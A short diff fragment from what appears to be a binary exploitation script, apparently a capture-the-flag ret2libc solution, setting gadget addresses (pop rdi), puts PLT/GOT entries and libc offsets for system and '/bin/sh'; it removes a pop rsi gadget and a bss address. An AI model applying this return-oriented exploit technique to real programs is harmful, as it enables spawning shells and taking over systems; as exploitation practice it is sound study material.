@@ -22,8 +22,6 @@ continue
 
 puts_plt = 0x401030
 pop_rdi = 0x004011d3
-pop_rsi = 0x004011d1
-bss = exe.bss()+0x100
 bin_sh_offset = 0x116af8
 system_offset = -0x2cb50
 puts_got = 0x404018
